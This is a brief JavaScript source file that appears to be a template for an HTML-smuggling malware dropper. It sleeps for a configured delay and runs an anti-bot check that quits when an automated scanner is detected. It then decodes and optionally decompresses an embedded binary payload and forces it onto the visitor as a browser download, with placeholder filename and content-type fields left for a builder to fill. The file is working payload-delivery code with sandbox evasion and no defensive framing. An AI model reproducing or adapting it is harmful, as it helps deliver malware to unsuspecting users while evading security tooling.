import { decompressSync, strToU8 } from "fflate";

import payload from "./assets/payload.bin";
import { download, isBot, sleep } from "./utils";

async function main() {
  // sleep before execution
  await sleep(CONFIG_DELAY);

  // antibot
  if (CONFIG_ANTIBOT) {
    const ib = await isBot();
    if (ib) {
      console.log("Detected bot, exit");
      return;
    }
  }

  // data decompressing and downloading
  console.log("Downloading data. Compressed:", CONFIG_COMPRESS);
  let data = strToU8(payload, true);
  data = CONFIG_COMPRESS ? decompressSync(data) : data;
  download(data, "dont_change_filename_var", "dont_change_content_type_var");
}

export { main as dontChangeFunctionName };
